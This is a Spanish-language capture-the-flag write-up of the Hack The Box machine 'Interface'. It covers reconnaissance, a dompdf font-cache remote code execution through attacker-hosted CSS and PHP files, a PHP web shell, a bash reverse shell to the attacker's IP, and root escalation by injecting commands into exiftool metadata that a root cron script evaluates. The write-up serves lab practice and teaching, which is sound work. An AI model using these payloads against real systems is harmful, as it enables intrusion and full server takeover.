---
layout: post
title: Interface
date: 2023-05-20
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Interface-htb/Interface.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.200 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:41 GMT
Nmap scan report for 10.10.11.200
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.200 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:44 GMT
Nmap scan report for 10.10.11.200
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.38 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologias que emplea el servidor web

```null
whatweb http://10.10.11.200
http://10.10.11.200 [200 OK] Country[RESERVED][ZZ], Email[contact@interface.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.200], Script[application/json], UncommonHeaders[content-security-policy], X-Powered-By[Next.js], nginx[1.14.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Interface-htb/1.png" alt="">

Introduzco una ruta que no existe para ver su respuesta

<img src="/writeups/assets/img/Interface-htb/2.png" alt="">

Se está empleando ```NextJS```

<img src="/writeups/assets/img/Interface-htb/3.png" alt="">

Me descargo todos los scripts en ```JS``` que se insertan en el código fuente

```null
for i in $(curl -s -X GET http://10.10.11.200 | grep -oP '".*?"' | tr -d '"' | grep "js$"); do wget http://10.10.11.200/$i; done
```

Utilizo ```js-beautify``` para darles un formato legible

```null
 js-beautify *
beautified _app-df511a3677d160f6.js
beautified _buildManifest.js
beautified framework-8c5acb0054140387.js
beautified index-c95e13dd48858e5b.js
beautified main-50de763069eba4b2.js
beautified polyfills-c67a75d1b6f99dc8.js
beautified _ssgManifest.js
beautified webpack-ee7e63bc15b31913.js
```

Se está empleando una ```api```

```null
grep -ri "api" --color
main-50de763069eba4b2.js:                    if (!r && "link" === e.type && e.props.href && ["https://fonts.googleapis.com/css", "https://use.typekit.net/"].some(t => e.props.href.startsWith(t))) {
main-50de763069eba4b2.js:                            if ("/api" === e || e.startsWith("/api/")) return X({
main-50de763069eba4b2.js:                return t && t !== r && (o || !a.pathHasPrefix(e.toLowerCase(), "/".concat(t.toLowerCase())) && !a.pathHasPrefix(e.toLowerCase(), "/api")) ? n.addPathPrefix(e, "/".concat(t)) : e
```

En base a las cabeceras, devuelve un código de estado ```404```, por lo que no es del todo accesible

```null
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 20 May 2023 15:58:29 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Next.js
ETag: "11m5h59p5ot1tc"
Vary: Accept-Encoding
Content-Length: 2352
```

Sin embargo, al hacer lo mismo desde la raíz, se puede ver un subdominio en el ```Content-Security-Policy```, que corresponde a un dominio interno de ```HackTheBox```

```null
curl -s -X GET http://10.10.11.200 -I
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 20 May 2023 16:01:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6359
Connection: keep-alive
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
X-Powered-By: Next.js
ETag: "i8ubiadkff4wf"
Vary: Accept-Encoding
```

Añado ```prd.m.rendering-api.interface.htb``` y ```interface.htb``` al ```/etc/hosts```

Espera un archivo

```null
curl -s -X GET http://prd.m.rendering-api.interface.htb/
File not found.
```

Fuzzeando solo encuentra la ruta ```/vendor```

```null
gobuster dir -u http://prd.m.rendering-api.interface.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://prd.m.rendering-api.interface.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/05/20 16:08:00 Starting gobuster in directory enumeration mode
===============================================================
/vendor               (Status: 403) [Size: 15]
                                              
===============================================================
2023/05/20 16:11:56 Finished
===============================================================
```

Tramito de nuevo la petición, pero esta vez al dominio en vez de la IP

```null
GET /api HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```null
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 20 May 2023 16:11:53 GMT
Content-Type: application/json
Connection: close
Content-Length: 50

{"status":"404","status_text":"route not defined"}
```

Con ```feroxbuster``` encuentro una ruta ```/html2pdf```. La razón es porque además de ```GET```, se puede probar otros métodos, en este caso ```POST```

```null
feroxbuster -u http://prd.m.rendering-api.interface.htb/api -m GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/api
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w       50c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST        1l        3w       50c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
422     POST        1l        2w       36c http://prd.m.rendering-api.interface.htb/api/html2pdf
[####################] - 64s    60000/60000   0s      found:1       errors:0      
[####################] - 63s    60000/60000   949/s   http://prd.m.rendering-api.interface.htb/api/   
```

Solicita parámetros

```null
curl -s -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf
{"status_text":"missing parameters"}
```

Como el servidor está empleando un framework Javascript, lo más probable es que esté esperando el parámetro en JSON. Utilizo ```wfuzz``` para descubrirlo

```null
wfuzz -c --hc=422 -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Content-Type: application/json" -d '{"FUZZ": "test"}' http://prd.m.rendering-api.interface.htb/api/html2pdf
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/html2pdf
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000078:   200        0 L      0 W        0 Ch        "html"
```

Lo replico en ```BurpSuite```. En las cabeceras de respuesta se puede ver el nombre de exportación

```null
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 20

{"html": "test"}
```

```null
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 21 May 2023 07:33:55 GMT
Content-Type: application/pdf
Content-Length: 1131
Connection: close
X-Local-Cache: miss
Cache-Control: public
Content-Transfer-Encoding: Binary
Content-Disposition: attachment; filename=export.pdf

%PDF-1.7
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R >>
endobj
2 0 obj
<< /Type /Outlines /Count 0 >>
endobj
3 0 obj
<< /Type /Pages
/Kids [6 0 R
]
/Count 1
/Resources <<
/ProcSet 4 0 R
/Font << 
/F1 8 0 R
>>
>>
/MediaBox [0.000 0.000 419.530 595.280]
 >>
endobj
4 0 obj
[/PDF /Text ]
endobj
5 0 obj
<<
/Producer (þÿ
```

Almaceno el PDF en un archivo

```null
curl -s -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf -H "Host: prd.m.rendering-api.interface.htb" -H "Content-Type: application/json" -d '{"html": "test"}' -o test
```

```null
file test
test: PDF document, version 1.7, 0 pages
```

Contiene únicamente la cadena que le he pasado como input

<img src="/writeups/assets/img/Interface-htb/4.png" alt="">

Se ha creado con ```dompdf 1.2.0```

```null
exiftool test -Producer
Producer                        : dompdf 1.2.0 + CPDF
```

Existe un exploit para esta versión en ```exploit-db```

```null
searchsploit dompdf
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                           | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                                                                                                     | php/webapps/14851.txt
Dompdf 1.2.1 - Remote Code Execution (RCE)                                                                                                                                     | php/webapps/51270.py
TYPO3 Extension ke DomPDF - Remote Code Execution                                                                                                                              | php/webapps/35443.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

```null
searchsploit -m php/webapps/51270.py .
mv 51270.py exploit.py
```

En este [artículo](https://positive.security/blog/dompdf-rce) se pueden ver más detalles de en que consiste. Envío desde ```BurpSuite``` el siguiente payload, y recibo una petición por ```GET``` a mi equipo

```null
{"html": "Test<link rel=stylesheet href='http://10.10.16.21/test.css'>"}
```

Este archivo CSS va a tratar de insertar una fuente, la cual contiene código en PHP

```null
@font-face {
   font-family:'TestFont';
   src:url('http://10.10.16.21/test_font.php');
   font-weight:'normal';
   font-style:'normal';
 }
```

Pero tiene que estar representado de cierta forma para que lo interprete

<img src="/writeups/assets/img/Interface-htb/5.png" alt="">

Es probable que los nombres de los archivos se queden cacheados y haya que cambiarlos. En mi caso, tuve que renombrarlos varias veces hasta conseguir RCE. El fichero PHP se almacena en una ruta tomando el hash MD5 de donde se extrajo

```null
echo -n 'http://10.10.16.21/test2.php' | md5sum
a6cb27becd76992a3dc0ddb7067c238a  -
```

<img src="/writeups/assets/img/Interface-htb/6.png" alt="">

Modifico el payload para poder ejecutar comandos a través de un parámetro por GET

```null
<?php system($_REQUEST['cmd']); ?>
```

Me envío una reverse shell

```null
curl -s -X GET http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/testfont_normal_bed5d2608a49b41b41378d8f3f76a512.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.21/443%200%3E%261%27
```

La recibo en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.11.200] 56092
bash: cannot set terminal process group (1356): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ script /dev/null -c bash
<r/dompdf/dompdf/lib/fonts$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ export TERM=xterm
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ export SHELL=bash
9ww-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ stty rows 55 columns 20
```

Puedo ver la primera flag

```null
www-data@interface:/home/dev$ cat user.txt 
981877441c3fdf05ae0492c753c0547e
```

# Escalada

Subo el ```pspy``` para encontrar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/05/21 08:42:01 CMD: UID=0    PID=44570  | /usr/sbin/CRON -f 
2023/05/21 08:42:01 CMD: UID=0    PID=44572  | /bin/bash /usr/local/sbin/cleancache.sh 
2023/05/21 08:42:01 CMD: UID=0    PID=44571  | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/05/21 08:42:01 CMD: UID=0    PID=44575  | cut -d   -f1 
2023/05/21 08:42:01 CMD: UID=0    PID=44574  | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/eviltest_original 
2023/05/21 08:42:01 CMD: UID=0    PID=44573  | /bin/bash /usr/local/sbin/cleancache.sh 
2023/05/21 08:42:02 CMD: UID=0    PID=44576  | /bin/bash /usr/local/sbin/cleancache.sh 
2023/05/21 08:42:02 CMD: UID=0    PID=44578  | cut -d   -f1 
2023/05/21 08:42:02 CMD: UID=0    PID=44577  | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/pspy 
```

Se está ejecutando un script de ```bash```

```null
www-data@interface:/tmp$ cat /usr/local/sbin/cleancache.sh
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

Por cada archivo dentro del directorio ```/tmp```, se pasa como argumento a ```exiftool``` para que extraiga los metadatos de ```Producer```. En caso de que se detecte que es igual a ```dompdf```, se eliminará

Modifico la bash a SUID

```null
www-data@interface:/tmp$ touch test
www-data@interface:/tmp$ exiftool -Producer='x[$(chmod${IFS}u+s${IFS}/bin/bash)]' test
www-data@interface:/tmp$ exiftool -Producer='arr[$(/tmp/pwned.sh)]' pwned
```

Puedo ver la segunda flag

```null
www-data@interface:/tmp$ bash -p
bash-4.4# cat /root/root.txt 
ed20fb3372ad80be3c93ea73e9a7d3db
```